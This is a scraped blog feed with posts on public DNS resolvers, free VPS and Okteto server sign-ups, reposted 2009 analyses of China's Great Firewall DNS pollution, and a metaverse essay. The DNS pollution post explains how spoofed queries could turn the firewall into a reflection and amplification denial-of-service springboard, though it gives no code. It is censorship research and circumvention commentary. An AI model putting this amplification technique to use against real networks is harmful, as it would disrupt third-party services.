（一般都是广东出口），。关于阿里的公共 DNS 没有听说太多宕机、无法使用相关的报告。，但是倒是听说阿里公共 DNS 时常有返回 NXDOMAIN 影响使用体验。 NSDOMAIN 问题已得到一定缓解。 南京信风公共 DNS Anycast：南京、济南、芝加哥 DNS 出口：未测出 TCP 查询：不支持 DoT、DoH：不支持 ECS：不支持 IPV4: 114.114.114.114, 114.114.115.115 无疑是国内最著名的公共 DNS，但是显然不是最好的。有 Anycast，国内有南京和青岛济南两个节点、海外有芝加哥节点，响应速度不敢恭维。国内最著名的公共 DNS、使用的人很多，SLA 非常可靠，因此也是运营商重点劫持的对象。但是考虑到南京信风为运营商旁路广告劫持提供技术和硬件支持，对他们提供的公共 DNS 服务还是戴着有色眼镜来看吧。 CNNIC 公共 DNS Anycast：北京、杭州、香港 DNS 出口：CNNIC 和阿里云 TCP 查询：不支持 DoT、DoH：不支持 ECS：不支持 IPV4: 1.2.4.8 ,210.2.4.8 CNNIC 名声并不好（CNNIC Root CA 的故事），因此有些许人相对都有些对 CNNIC 的抵触心理。CNNIC 的公共 DNS（SDNS）国内仅双点部署、Anycast 配得一塌糊涂、速度堪忧，解析结果没有 CDN 优化（DNS 出口都是阿里云）。至于撇开 CNNIC 来谈 SDNS 推不推荐使用？SLA 比 DNSPod 的公共 DNS 还惨，解析请求时不时超时。 百度公共 DNS Anycast：北京、南京、深圳 DNS 出口：同上 DoT、DoH：不支持 TCP 查询：不支持 ECS：不支持 IPV4：180.76.76.76 IPV6: 2400:da00::6666 百度的名声现在怕是比 CNNIC 还要臭得多，他们的公共 DNS 于 2017 年上线，现在也不被太多人知道，不过还是简单提两笔：百度也为公共 DNS 也配置了 Anycast，国内是北京、南京、深圳三点，海外是单点百度香港数据中心。用的人少，也许不容易被运营商劫持，有兴趣的可以试一试看。 国外常用 DNS 服务 Google Public DNS Anycast：Google 的 36 个数据中心（不包括 Google Global Cache） DNS 出口：Google 全球边缘网络 TCP 查询：支持 DoH: https://dns.google/dns-query – RFC 8484 (GET and POST) https://dns.google/resolve? – JSON API (GET) DoT：dns.google ECS：支持（DNS JSON API 支持 edns_client_subnet） IPV4: 8.8.8.8 ,8.8.4.4 IPV6: 2001:4860:4860::8888 ,2001:4860:4860::8844 最著名的公共 DNS（即使在国内也是很有名的），得益于 Google 庞大的全球网络设施（不过 Google 公共 DNS 并未使用 Google Global Cache，并且在非洲和大洋洲也没有节点），速度虽然不能说是最快的，但是至少不慢；支持 ECS、DoH、DoT，SLA 无限接近 100（Google 搜索引擎的 SLA 是 99.9999%），海外 CDN 都有针对 Google DNS 做优化，解析海外站点时强烈推荐。 Cloudflare DNS Anycast：Cloudflare 的 160+ 个数据中心 DNS 出口：Cloudflare 的 160+ 个数据中心 TCP 查询：支持 DoH：https://cloudflare-dns.com/dns-query DoT: cloudflare-dns.com ECS：不支持（由于 ECS 需要基于用户 IP 查询，和 Cloudflare DNS 保护隐私相违背） IPV4: 1.0.0.1 ,1.1.1.1 IPV6: 2606:4700:4700::1111, 2606:4700:4700::1001 当 Cloudflare 从 APNIC 手上接过 1.0.0.0/24 和 1.1.1.0/24 并架设了公共 DNS 以后，得益于 Cloudflare 全球 160+ 数据中心（Cloudflare 拥有 185+ 数据中心，但其公共 DNS 并没有部署在百度云加速的节点上）、BGP Anycast 和 Cloudflare Argo 等技术，成功超越 OpenDNS 成为了世界上最快的公共 DNS（数据来自 DNSPerf），还支持 DoT、DoH 等常见加密解析方案。由于其隐私政策，Cloudflare 公共 DNS 不记录用户 IP，意味着无法使用 ECS 等技术，不过仗着节点数量众多、DNS 出口覆盖全球各大区域，也适合作为主力 DNS。 OpenDNS Anycast：OpenDNS 的 32 个数据中心 DNS 出口：未测出 TCP 查询：支持 DoT：不支持 DoH: https://doh.opendns.com/dns-query ECS：支持 IPV4: 208.67.222.222, 208.67.220.220 IPV6: 2620:119:35::35 ,2620:119:53::53 被 Cisco 收购的 OpenDNS 一度是世界上最快的公共 DNS——OpenDNS 在全球拥有 30 余节点并且 Anycast 配的很棒。支持 ECS 和 SLA 达到 100，而且 OpenDNS 开放非常规端口 5353 查询和 TCP 查询，即使从国内直接请求也不容易被污染和劫持。如果你在使用 ChinaDNS 这类工具同时又没有专门为其准备一条加密隧道，那么直连 OpenDNS 的 5353 就是一个不错的替代选择。 Freenom World Anycast：是 DNS 出口：Freenom 的 Transit 的 IP TCP 查询：支持 DoT、DoH：不支持 ECS：支持 IPV4: 80.80.80.80 ,80.80.81.81 注册过后缀如 .cf .ga .ml .gq .tk的免费域名的，对 Freenom 这个名字一定不会陌生。这家荷兰域名注册商借助自己旗下的云服务资源也运营了一家公共 DNS 服务，卖点是隐私和安全。支持 ECS，测到的 DNS 出口都是落地 IP。部署了 Anycast 但是节点不多，响应速度并不算拔尖。Freenom 的公共 DNS 的一个特点其实是电信走 163 去 HK，联通移动走 IIJ 去 JP，因此如果你所在的地区和 ISP 对国外递归 DNS 的污染并不严重的话可以尝试使用 Freenom 的 DNS。 DNS.sb Anycast：是 DNS 出口：SB Network 的上游的 IP TCP 查询：支持 DoH：https://doh.sb/dns-query DoT: dot.sb ECS：不支持 IPV4: 185.222.222.222 45.11.45.11 IPV6: 2a09:: 2a11:: 和 Cloudflare 一样支持主流的 DoT、DoH 等加密 DNS 解析。启用了 Anycast，节点可能没有 Cloudflare 那么多，不过还是覆盖了大部分地区；此外，有 VPS 的可以试试 trace 一下 185.222.222.222、没准你会发现你的 VPS 和 dns.sb 在同一内网里。 公共 DNS 最佳实践 综上所述，如果你需要选择公共 DNS 的话同时需要获得尽可能友好的 CDN 解析结果，解析国内站点推荐使用阿里 DNS 和腾讯 DNSPod（注重稳定请用前者、注重准确请用后者）；解析海外网站推荐主 DNS 1.1.1.1 或 208.67.222.222，备 DNS 8.8.8.8 或 8.8.4.4；有从国人商家购买 VPS 的可以 trace 一下 185.222.222.222 试试看。 本文采用 CC BY-NC-SA 4.0 许可协议，著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 作者：Sukka 来源：如何选择适合的公共 DNS？ [2020] | Sukka's Blog 链接：https://blog.skk.moe/post/which-public-dns-to-use/ ","link":"https://blog.gd1214b.icu/post/Zr3HDqj6D/"},{"title":"白嫖 Hax 1核512M 纯 IPV6 VPS","content":"机器配置 CPU：AMD Ryzen 5 3600 6-Core Processor x1 内存：500M(Oper-VZ)/450M(KVM) 磁盘：5GB IPv6：1 数据中心：欧洲 申请步骤 官网： https://hax.co.id/register 打开Telegram，搜索并打开 @HaxTG_bot。 输入 /getid，获取你的用户 ID，然后在网站内复制黏贴你的用户 ID, 接下来会通过 给你发送一个密钥，复制并填入网站内。 使用 Telegram 账号用户 id 和刚刚设置的登录密码登录。 打开https://hax.co.id/create-vps/ 一项项填入，第一个操作系统，第二个 root 密码，第三个 VPS 的用途，第四个是 VPS 地区。 下面的几个选项需要全部同意并通过人机验证，等待 VPS 初始化。 等待网站配置好您的 VPS 服务器，大概需要 1-3 分钟的时间 。 连接vps 打开：https://hax.co.id/vps-info即可进入你的 VPS 管理界面，有你的 IPV6 地址，一些 SSH 教程，VPS 控制，网站、文件管理等工具。 如果你的网络不支持ipv6的话，可以到：https://hax.co.id/ipv6-to-ipv4/上添加一个端口转发。 注意事项 免费 VPS 只有一周时间，需要一直续期，在网站主界面选择上面的 Extend VPS 即可，网址填hax.co.id。 每个用户只有免费一台 VPS。 禁止挖矿等一切高 CPU 的占用活动（拿 VPS 挖矿哪家都会讨厌的吧）。 VPS 用途一栏有 VPN Server，也就意味着搭建梯子等是不管的。 中文用户群： https://t.me/ipv6china 英文用户群： https://t.me/ipv6server ","link":"https://blog.gd1214b.icu/post/8bMggYQLK/"},{"title":"白嫖Okteto4核26G服务器","content":"注册Okteto 打开https://cloud.okteto.com/#/login,点击Log in With GitHub: 部署Debain远程桌面 点击Deploy: 选择Git URL，输入: https://github.com/gd1214b/okteto-debain-desktop.git ,点击Deploy: 稍等几分钟即可完成部署 登录远程桌面 部署完成之后，点击这个链接： 打开登陆界面：（如果你没看到下面这个界面请再等几分钟） 点击连接，密码输入uncleluo，完成登陆： 服务器测评 操作系统是debian，有root权限： 4核CPU，26G内存，300多G硬盘，算是高配了： 服务器IP是谷歌云的： 网速还可以： 结语 总的来说，这台云服务器的性能还是可以的，大家可以好好玩一下。 如果你在部署过程中遇到任何问题，欢迎在下方的评论区中提出。 ","link":"https://blog.gd1214b.icu/post/90HZMOqyO/"},{"title":"深入理解GFW：DNS污染","content":" 本文转自：https://gfwrev.blogspot.com/2009/11/gfwdns.html 初识DNS污染 DNS（Domain Name System）污染是GFW的一种让一般用户由于得到虚假目标主机IP而不能与其通信的方法，是一种DNS缓存投毒攻击（DNS cache poisoning）。其工作方式是：对经过GFW的在UDP端口53上的DNS查询进行入侵检测，一经发现与关键词相匹配的请求则立即伪装成目标域名的解析服务器（NS，Name Server）给查询者返回虚假结果。由于通常的DNS查询没有任何认证机制，而且DNS查询通常基于的UDP是无连接不可靠的协议，查询者只能接受最先到达的格式正确结果，并丢弃之后的结果。对于不了解相关知识的网民来说也就是，由于系统默认使用的ISP提供的NS查询国外的权威服务器时被劫持，其缓存受到污染，因而默认情况下查询ISP的服务器就会获得虚假IP；而用户直接查询境外NS（比如OpenDNS）又可能被GFW劫持，从而在没有防范机制的情况下仍然不能获得正确IP。然而对这种攻击有着十分简单有效的应对方法：修改Hosts文件。但是Hosts文件的条目一般不能使用通配符（例如*.blogspot.com），而GFW的DNS污染对域名匹配进行的是部分匹配不是精确匹配，因此Hosts文件也有一定的局限性，网民试图访问这类域名仍会遇到很大麻烦。 观测DNS污染 “知己知彼，百战不殆”。这一节我们需要用到前面提到的报文监听工具，以及参考其DNS劫持诊断一节。在Wireshark的filter一栏输入udp.port eq 53可以方便地过滤掉其他无关报文。为了进一步减少干扰，我们选择一个并没有提供域名解析服务的国外IP作为目标域名解析服务器，例如129.42.17.103。运行命令nslookup -type=A www.youtube.com 129.42.17.103。如果有回答，只能说明这是GFW的伪造回答，也就是我们要观测和研究的对象。 伪包特征 经过一番紧密的查询，我们可以发现GFW返回的IP取自如下列表： 4.36.66.178 203.161.230.171 211.94.66.147 202.181.7.85 202.106.1.2 209.145.54.50 216.234.179.13 64.33.88.161 关于这八个特殊IP，鼓励读者对这样两个问题进行探究：1、为什么是特定的IP而不是随机IP，固定IP和随机IP各自有什么坏处；2、为什么就是这8个IP不是别的IP，这8个IP为什么倒了GFW的霉？关于搜索这类信息，除了www.google.com之外，www.bing.com有专门的搜索IP对应网站的功能，使用方法是输入ip:IP地址搜索。www.robtex.com则是一个专门收集域名解析信息的网站。欢迎读者留下自己的想法和发现。 从Wireshark收集到的结果分析（实际上更好的办法是，将结果保存为pcap文件，或者直接使用tcpdump，由tcpdump显示成文本再自行提取数据得到统计），我们将GFW发送的DNS污染包在IP头部的指纹特征分为两类： 一型： ip_id == ____（是一个固定的数，具体数值的查找留作习题）。 没有设置“不分片”选项。 没有设置服务类型。 对同一对源IP、目标IP，GFW返回的污染IP在上述8个中按照给出的顺序循环。与源端口无关、与源IP目标IP对相关。 TTL返回值比较固定。TTL为IP头部的“Time to Live”值，每经过一层路由器这个值会减1，TTL为1的IP包路由器将不再转发，多数路由器会返回源IP一条“ICMP time to live exceed in transit”消息。 二型： 每个包重复发送3次。 没有设置“不分片”选项。 设置了“保障高流量”服务类型。 (ip_id + ? * 13 + 1) % 65536 == 0，其中?为一个有趣的未知数。ip_id在同一个源IP、目标IP对的连续查询之间以13为单位递减、观测到的ip_id的最小值和最大值分别为65525（即-11，溢出了!）和65535。 对同一对源IP、目标IP，GFW返回的污染IP在上述8个中按照给出的顺序循环。与源端口无关、与源IP目标IP对相关。 对同一对源IP、目标IP，TTL返回值时序以1为单位递增。TTL在GFW发送时的取值有64种。注：源IP接收到的包的TTL被路由修改过，所以用户观测到的TTL不一定只有64种取值，这是由于网络拓扑变化的原因导致的。一型中的“比较固定”的“比较”二字也是考虑到网络拓扑偶尔的变化而添加的，也许可以认为GFW发送时的初始值是恒定的。 （以上结果仅保证真实性，不保证时效性，GFW的特征随时有可能改变，尤其是时序特征与传输层特征相关性方面。最近半年GFW的特征在很多方面的变化越来越频繁，在将来介绍TCP阻断时我们会提到。） 还可以进行的实验有：由于当前二型的TTL变化范围是IP个数的整数倍，通过控制DNS查询的TTL使得恰好有GFW的返回（避免动态路由造成的接收者观察到的TTL不规律变化），观察IP和TTL除以8的余数是否有对应关系，在更改源IP、目标IP对之后这个关系是否仍然成立。这关系到的GFW负载平衡算法及响应计数器（hit counter）的独立性和一致性。事实上对GFW进行穷举给出所有关于GFW的结果也缺乏意义，这里只是提出这样的研究方法，如果读者感兴趣可以继续探究。 每次查询通常会得到一个一型包和三个完全相同的二型包。更换查询命令中type=A为type=MX或者type=AAAA或者其它类型，可以看到nslookup提示收到了损坏的回复包。这是因为GFW的DNS污染模块做得十分粗制滥造。GFW伪造的DNS应答的ANSWER部分通常只有一个RR组成（即一条记录），这个记录的RDATA部分为那8个污染IP之一。对于二型，RR记录的TYPE值是从用户查询之中直接复制的。于是用户就收到了如此奇特的损坏包。DNS响应包的UDP荷载内容特征： 一型 DNS应答包的ANSWER部分的RR记录中的域名部分由0xc00c指代被查询域名。 RR记录中的TTL设置为5分钟。 无论用户查询的TYPE是什么，应答包的TYPE总是设置为A（IPv4地址的意思）、CLASS总是设置为IN。 二型 DNS应答包的ANSWER部分的RR记录中的域名部分是被查询域名的全文。 RR记录中的TTL设置为1天。 RR记录中的TYPE和CLASS值是从源IP发送的查询复制的。 其中的术语解释：RR = Resource Record：dns数据包中的一条记录；RDATA = Resource Data：一条记录的数据部分；TYPE：查询的类型，有A、AAAA、MX、NS等；CLASS：一般为IN[ternet]。 触发条件 实际上DNS还有TCP协议部分，实验发现，GFW还没有对TCP协议上的DNS查询进行劫持和污染。匹配规则方面，GFW进行的是子串匹配而不是精确匹配，并且GFW实际上是先将域名转换为字符串进行匹配的。这一点值得特殊说明的原因是，DNS中域名是这样表示的：一个整数n1代表以“.”作分割最前面的部分的长度，之后n1个字母，之后又是一个数字，若干字母，直到某次的数字为0结束。例如www.youtube.com则是&quot;\\x03www\\x07youtube\\x03com\\x00&quot;。因此，事实上就可以观察到，对www.youtube.coma的查询也被劫持了。 现状分析 4.36.66.178，关键词。whois：Level 3 Communications, Inc. 位于Broomﬁeld, CO, U.S. 203.161.230.171，关键词。whois：POWERBASE-HK位于Hong Kong, HK. 211.94.66.147，whois：China United Network Communications Corporation Limited位于Beijing, P.R. China. 202.181.7.85，关键词。whois：First Link Internet Services Pty Ltd.位于North Rocks, AU. 202.106.1.2,whois：China Unicom Beijing province network位于Beijing, CN. 209.145.54.50，反向解析为dns1.gapp.gov.cn，新闻出版总署的域名解析服务器？目前dns1.gapp.gov.cn现在是219.141.187.13在bjtelecom。whois：World Internet Services位于San Marcos, CA, US. 216.234.179.13，关键词。反向解析为IP-216-234-179-13.tera-byte.com。whois：Tera-byte Dot Com Inc.位于Edmonton, AB, CA. 64.33.88.161，反向解析为tonycastro.org.ez-site.net, tonycastro.com, tonycastro.net, thepetclubfl.net。whois：OLM,LLC位于Lisle, IL, U.S. 可见上面的IP大多数并不是中国的。如果有网站架设到了这个IP上，全中国的Twitter、Facebook请求都会被定向到这里——好在GFW还有HTTP URL关键词的TCP阻断——HTTPS的请求才构成对目标IP的实际压力，相当于中国网民对这个IP发起DDoS攻击，不知道受害网站、ISP是否有索赔的打算？ 我们尝试用bing.com的ip反向搜索功能搜索上面那些DNS污染专用IP，发现了一些有趣的域名。显然，这些域名都是DNS污染的受害域名。 例如倒霉的edoors.cn.china.cn，宁波中国门业网，其实是因为edoors.cn被dns污染。一起受害的* 还有chasedoors.cn.china.cn，美国蔡斯门业（深圳）有限公司。 还有*.sf520.com，似乎是一个国内的游戏私服网站。www.sf520.com也是一个私服网站。可见国内行政体系官商勾结之严重，一个“国家信息安全基础设施”竟然还会用来保护一些网游公司的利益。 此外还有一些个人blog。www.99tw.net也是一个游戏网站。 还有www.why.com.cn，名字起得好。 还有www.999sw.com 广东上九生物降解塑料有限公司生物降解树脂|增粘母料|高效保水济|防洪 邮编:523128……这又是怎么一回事呢？不像是被什么反动网站连坐的。还有人问怎么回事怎么会有那么多IP结果。 www.facebook.comwww.xiaonei.com，怎么回事呢？其实是因为有人不小心把两个地址连起来了，搜索引擎以为这是一个链接，其实这个域名不存在，但是解析的时候遭到了污染，就以为存在这个域名了。 倒霉的www.xinsheng.net.cn——武汉市新胜电脑有限公司，因为www.xinsheng.net被连坐。 DNS劫持的防范和利用 之前我们已经谈到，GFW是一套入侵检测系统，仅对流量进行监控，暂没有能力切断网络传输，其“阻断”也只是利用网络协议容易被会话劫持（Session hijacking）的弱点来进行的。使用无连接UDP的DNS查询只是被GFW抢答了，真正的答案就跟在后面。于是应对GFW这种攻击很自然的想法就是： 根据时序特性判断真伪，忽略过早的回复。 通常情况对于分别处于GFW两端的IP，其RTT（Round-trip time，往返延迟）要大于源IP到GFW的RTT，可以设法统计出这两个RTT的合适的均值作为判断真伪的标准。另外由于GFW对基于TCP的DNS请求没有作处理，于是可以指定使用TCP而不是UDP解析域名。也可以通过没有部署GFW的线路到没有被DNS污染的NS进行查询，例如文章一开始提到的“远程解析”。但黑体字标出的两个条件缺一不可，例如网上广为流传的OpenDNS可以反DNS劫持的说法是以讹传讹，因为到OpenDNS服务器的线路上是经由GFW的。 本质的解决办法是给DNS协议增加验证机制，例如DNSSEC（Domain Name System Security Extensions），客户端进行递归查询（Recursive Query）而不查询已经被污染了的递归解析服务器（Recursive/caching name server）。然而缺点是目前并非所有的权威域名解析服务器（Authoritative name server）都支持了DNSSEC。Unbound提供了一个这样的带DNSSEC验证机制的递归解析程序。 另外GFW的DNS劫持还可能被黑客利用、带来对国际国内互联网的严重破坏。一方面，GFW可能在一些紧急时刻按照“国家安全”的需要对所有DNS查询都进行污染，且可能指定污染后的IP为某个特定IP，使得全球网络流量的一部分直接转移到目标网络，使得目标网络立刻瘫痪。当然我们伟大的祖国郑重承诺“不率先使用核武器”…另一方面，GFW将伪造的DNS返回包要发送给源IP地址的源端口，如果攻击者伪造源IP，会怎样呢？将会导致著名的增幅攻击：十倍于攻击者发送DNS查询的流量将会返回给伪源IP，如果伪源IP的端口上没有开启任何服务，很多安全配置不严的系统就需要返回一条ICMP Port Unreachable消息，并且将收到的信息附加到这条ICMP信息之后；如果伪源IP的端口上开启了服务，大量的非法UDP数据涌入将使得伪源IP该端口提供的服务瘫痪。如果攻击者以1Gbps的速度进行查询，一个小型IDC（DNSpod被攻击事件）甚至一个地域的ISP也会因此瘫痪（暴风影音事件）。攻击者还可能设置TTL使得这些流量恰好通过GFW产生劫持响应，并在到达实际目标之前被路由丢弃，实现流量“空对空不落地”。攻击者还可能将攻击流量的目标IP设置伪造成与伪源IP有正常通信或者其他关联的IP，更难以识别。这样实际上就将一个国家级防火墙变成了一个国家级反射放大式拒绝服务攻击跳板。 最为严重的是，这种攻击入门难度极低，任何一个会使用C语言编程的人只要稍微阅读libnet或者libpcap的文档，就可能在几天之内写出这样的程序。而GFW作为一套入侵防御系统，注定缺乏专门防范这种攻击的能力，因为如果GFW选择性忽略一些DNS查询不进行劫持，网民就有机可乘利用流量掩护来保证真正的DNS通信不被GFW污染。尤其是UDP这样一种无连接的协议，GFW更加难以分析应对。“反者道之动，弱者道之用。” 参考文献 闫伯儒, 方滨兴, 李斌, 王垚. &quot;DNS欺骗攻击的检测和防范&quot;. 计算机工程, 32(21):130-132,135. 2006-11. Graham Lowe, Patrick Winters, Michael L. Marcus. The Great DNS Wall of China. 注：这篇文章虽然试图通过统计特性了解GFW，但由于实验条件控制不佳、实验结果观察不细致，加上缺乏对GFW的整体观，故没有提供什么有意义的结论。然而美国同学的这种科学态度与实验精神值得我们学习和思考。事实上，这篇文章仍然提供了珍贵的历史资料，读者不妨按照本文逻辑来分析这篇参考文献。阅读过这篇文献的敏感的读者还将在我们后续的文章中看到熟悉的数字。 KLZ毕业. 入侵防御系统的评测和问题. 注：本文对DNS污染包的分类就是从这篇文章的分类继承而来。 ","link":"https://blog.gd1214b.icu/post/H6XBza37Y/"},{"title":"深入理解GFW：总论","content":" 本文转自：https://gfwrev.blogspot.com/2009/10/gfw.html GFW，Great Firewall of China，防火长城，通常把它看作一个国家级的网络审查系统。关于网络审查，人们通常首先会有一番政治性的话要说，不过政治批评这个角度的言论实在是过多，GFW的实体在“GFW”这个这个巨大的外壳之下隐藏了多年，人们只是对着“GFW”这个词空发怒气却并不知道它究竟是什么。实际上GFW除了是一个让网民十分不舒服的系统之外，在技术上它还是一个非常复杂有趣的黑箱，一个通关奖品是网络自由的解谜游戏。接下来一段时间我们便会对GFW进行深入的探索和理解，大家很快就会了解到它的趣味。提示：阅读此“深入理解GFW”系列之前建议读者对TCP/IP协议族、网络安全、反向工程有基本的了解。 GFW的技术结构 知己知彼，百战不殆，我们应该先对GFW有清晰的技术性认识。防火长城条目称GFW的主要技术是域名劫持、IP封锁、关键字过滤阻断、HTTPS证书过滤。实际上这些技术在实现上可以归结为两种技术：IP封锁和入侵检测，其中入侵检测是核心。IP封锁因为比较底层，接近于切光缆拔网线，没有什么技术可言，这种封锁实施以后除了绕道而过也没有更好的解决办法。而入侵检测则是GFW最为强大灵活的功能。 传输层的TCP和UDP解析都是入侵检测业界的标准配置。UDP通常用来做DNS查询劫持，一个附加效果就是国内的域名缓存充满了污染。应用层就更加百花齐放了，因为解析一个协议实在不是一件困难的事情。所谓的SSL证书拦截也不过是稍微做了一下SSL/TLS协议的解析而已，并无神秘之处。这就是入侵检测的强大之处。 入侵检测的灵活之处在于它的部署和撤销都很便捷无副作用无延迟，匹配精确无误伤。举一例，要防止一些反动软件通过https访问google docs获取信息，怎么做？在应用层检测证书显然是杀鸡用牛刀浪费性能了；用动态路由封特定IP的特定端口是不行的，因为解析结果在不断地变，动态路由的变化跟不上；用域名污染更不行了，把80端口的web业务也搞掉了，影响太大；所以就在传输层乱发RST做无状态的连接阻断，写个脚本定时更新解析结果，这也就是google的数据中心只有在中国解析出来的那部分被封掉的原因。 GFW的设备有两种，一种是在北京、上海、广州搭在总交换中心上做旁路监听的入侵检测设备，一种是放在ISP那里的动态路由设备。一般来说入侵检测总是比动态路由来得灵活，所以RST要比封IP更常用。另外，碰到网站无法访问然后traceroute发现线路死在ISP骨干上于是责怪ISP，这是不合理的。中国的ISP的一项主要业务就是接待各个强力部门的插入，纪检、军队、公安之类的部门都会长期插入。 GFW的工作方式 GFW的日常工作方式：当国新办发现了反动文宣，当公安部十一局发现了色情图片，当版署发现了盗版网站，总之当有关部门发现了有害非法信息，就发指令给GFW，然后GFW的政策部门研究一下采取怎样的具体封锁措施为宜，然后将具体操作交给技术部门执行封锁。解封也是一样的渠道，简而言之就是领导一句话胜过千军万马，至于让领导发这一句话靠的就是PR了。举一例，受到NED暗中操控的twitter长期以来充满反动有害信息，但做技术的人都明白twitter的这种架构是没有办法封的。对twitter.com什么办法都用了，效果不大好，结果领导不满意地催促了。这个交不了差是很严重的事情啊，怎么办呢，就对twitter搞破坏吧。凡是跟twitter有关的第三方网站，见一个斩一个，领导你看我都把twitter诛九族了，这已经是自古以来用刑的极致了。再举一例，如何封掉一个网站？先在这个网站上放置一些有害非法信息，再去违法和不良信息举报中心（后台国新办）举报之，等十天就成了。 GFW的研发方式：“国家信息安全管理系统”建设的历史参见《阅后即焚：“GFW”的前世今生，一部“GFW”之父方滨兴的发家史》。当有关部门发现了一个反革命翻墙方法，就告诉GFW，然后GFW的逆向工程人才研究一下这个方法的工作方式，找到它的特定模式和弱点，制定相应的封锁预案。当有关部门指示实施封锁的时候，预案便付诸实施。p2p方面的反动软件比较不好办，于是在第一生产力院成立242项目“P2P协议分析与测量”专门研究之。 GFW实体是安管中心（CNCERT/CC），是事业单位。一个事业单位的政治地位可以想是很低的，凡是它的上级都可以向它下指令进行网络封锁，而它本身则没有任何主观能动性，专于业务，勤勤恳恳抓好国家安全基础设施的建设。如果转换角度，从GFW的视角来考虑，那么GFW所做的事情其实并不神秘，其实恰恰符合了它自己的名义。我们来看看精美的“宽带网络环境下恶意代码监测系统”，你们访问一下blogger、wordpress那就是URL攻击啊，而且要比一般的钓鱼攻击和病毒更严重，因为危害的是党和国家的安全啊。GFW的研发也与一般的网络安全公司所做别无二致，监视分析网络流量，逆向工程有害软件，阻断恶意攻击，区别只在于：GFW为了国家安全也要处理一下你们这些反革命的攻击；另外GFW还开了金钱无限、人口无限和无敌秘笈。 GFW与网民的生态系统 政府、GFW与网民构成了一个生态系统，政府与GFW共生于食物链的上端，网民处于食物链的下端。有人称之为“猫和老鼠的游戏”。观GFW与网民的互动历史，可以归结为相互提升技术水准的军备竞赛，但尽管如此两者的关系也从来没有打破GFW越来越善于主动追捕网民越来越善于被动逃避的模式。从最开始的普通HTTP代理、SOCKS代理，到加密代理软件，到种类繁多的网页代理，到VPN、SSH代理，到p2p网络，以及混合方法。然而这些方法都未曾彻底免于GFW的封锁，这是因为GFW很善于进攻，而网民们迄今为止只会不断地四处寻找新的逃避办法。 这种互动模式的问题在于，随着军备竞赛的继续，GFW越来越完善越来越强大，而网民不断地失去手中的牌，翻墙的难度和成本越来越高。GFW是这个领域（网络安全）的专业人士，而网民虽然富有群体智慧，但是其技术能力缺乏有效组织不能与GFW对等。因此如果稍微看得远一些就会了解到，这种模式对于网民来说是不可持续的，总有一天GFW会超过绝大多数网民的技术基准线。所以，唯一的出路便是改变方式，突破这种模式。 应对GFW 网民突破当前被动态势方法的基本原理，在后面的章节中我们会看到，在于利用GFW在善于进攻的同时不善于防守的特点。与其把GFW看作国家网络暴力机关，不如把GFW看作一个网络安全机构，事实上它也是一个网络安全机构（CNCERT/CC）。任何安全系统必然都有漏洞和弱点，它所提供的这个GFW安全解决方案（国家信息安全管理系统）也不例外。网民并非缺乏技术，而是技术没有得到有效组织，没有往这个方向进行有效投射。实际上GFW漏洞和弱点并不少，有一些甚至是理论上无法解决的，这在以后会详细论述。正如《阅后即焚》一文所言，GFW尽管是中国少有的顶尖科研力量与国家强力支持结合的产物，“但也无法摆脱山寨的本性——做一个东西出来很容易，但是要把这个东西做得细致严格就不行了”。 更进一步，除了利用GFW本身的问题以外，网民甚至还可以考虑采取网络正当防卫的方式阻止GFW的非法行为。像GFW这种机构，无行政立法，无舆论监督，无申诉渠道，被少数别有用心的人利用，滥用国家安全之名义，封锁与国家安全毫无关系的网站，对合法的网络通信进行干扰和攻击，“对计算机信息系统正在进行传输的合法数据进行篡改，向计算机信息系统进行攻击令其无法正常运行”，甚至曾多次造成全国性网络故障，已触犯《中华人民共和国刑法》第二百八十六条，情节特别严重，后果特别恶劣，等等。 然而另一方面，GFW与网民之间已经或者即将形成某种稳态，这种稳态是双方斗争状况下的动态平衡，是需要有意识维护的。一个无法控制的网络是无法被政府所容忍的，当网络无法控制时政府是不吝于切断一切网络的（你一定知道我在说什么），稳态的破坏也就意味着环境的毁灭。一个理想的稳态就是网络处于“看起来”可以控制的状态，让GFW处于不断取得小型封锁成功的虚幻胜利感之中，网民个人各自掌握非中心化的翻墙方法。一个中心化的大众翻墙方法（最典型的例子就是设置hosts静态解析）必定无法避免被当局发现并被GFW封锁。下一代的翻墙方法应该是去中心化的（p2p）、小众的、多样化的、混合型的、动态更新的。 参考文献 有两篇重要文献在这里要推荐。 首先是Thomas Ptacek等在98年发表的Insertion, Evasion, and Denial of Service: Eluding Network Intrusion Detection。这篇是在入侵检测领域具有里程碑意义的论文，是论述入侵检测原理性漏洞的集大成者。其简明介绍早在07年就出现在英文维基，非专业人士可以一睹为快；专业人士建议仔细阅读原文，以后关于探索GFW漏洞的技术都基于此篇论文所描述的原理。 另外一篇是《阅后即焚：“GFW”的前世今生，一部“GFW”之父方滨兴的发家史》，是一份关于GFW的详尽的社会调查，澄清了大量关于GFW的误解，本文大量引用此文。这篇文章的重要性从侧面可以发现：前面引用过中文维基的防火长城条目，如果直接访问会发现，这个条目直接访问之后维基百科就被封锁了。这是有原因的，而且原因是可以找到的，寻找原因的方法将在以后几节介绍，这里长话短说原因就是：这个页面中含有一个关键词：“阅后即焚”。与一般的关键词不同，这个关键词很厉害，随便什么地方出现这个关键词都会引起有趣的现象，比如这里，这种现象通常被人们称为深度包检测。像法轮六四这样煽动颠覆的词语都没有成为深度检测关键词，这种顶级过滤的词很少，另一个例子就是GFW头号死敌的名字：“dongtaiwang.com”。一般来说，越是被禁止，就越有趣；越是被否认，就越接近真相。另外注意到，有一篇内容相似的文章《GFW的前世今生》，对比两者发现后者似乎被添加了一些不相关或者夸张性的文字，原文应该是首发在自曲新闻的前者。 在下一次的文章中我们将介绍GFW进行黑箱分析的方法，并得到一些有趣的结果。 ","link":"https://blog.gd1214b.icu/post/i8pDWHKdD/"},{"title":"雪崩才是元宇宙的必然","content":" 本文转自 :https://mp.weixin.qq.com/s/NgIkudVZrnbA1KwZfEgoQQ 行了，是时候来聊聊这个让 Facebook 丢下脸面的东西了。 美国当地时间2021年10月28日，在一年一度的 Facebook Connect 开发者大会上，马克·扎克伯格正式宣布，创立于 2004 年的 Facebook 正式更名为“Meta”——也就是“元宇宙（Metaverse）”的那个“元”。 靴子落下来了。不要面子的小扎，笃定要玩一把新概念给 SNS 续一波命了。 Facebook 的更名似乎对元宇宙概念来说并不是好事，它甚至是某种象征，它给了火热近一年但至今仍然没人能解释清楚的元宇宙概念浇了一盆冷水。 随着更名事件在中英文世界刷屏，除了极端的技术乐观主义者，人们普遍对元宇宙的批判大过了期待。在微博和 Twitter 上元宇宙成了许多段子嘲讽的对象。但正如没人能说清楚什么是元宇宙一样，就连批判元宇宙似乎也无的放矢。 毕竟，你似乎是永远打不败一个根本不存在的新东西。 